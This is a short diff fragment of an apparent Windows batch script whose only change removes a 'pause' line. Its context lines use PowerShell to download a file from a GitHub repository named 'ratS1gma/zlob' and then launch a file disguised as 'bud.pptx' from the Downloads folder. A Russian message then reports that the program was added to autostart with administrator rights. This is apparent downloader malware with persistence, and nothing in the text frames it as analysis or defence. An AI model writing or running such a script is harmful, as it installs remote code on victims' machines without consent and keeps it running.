@@ -36,4 +36,3 @@ powershell Invoke-WebRequest -Uri "https://github.com/ratS1gma/zlob/raw/refs/hea
 powershell Start-Process -FilePath "%USERPROFILE%\Downloads\bud.pptx"
 
 echo Программа добавлена в автозагрузку с правами администратора.
-pause
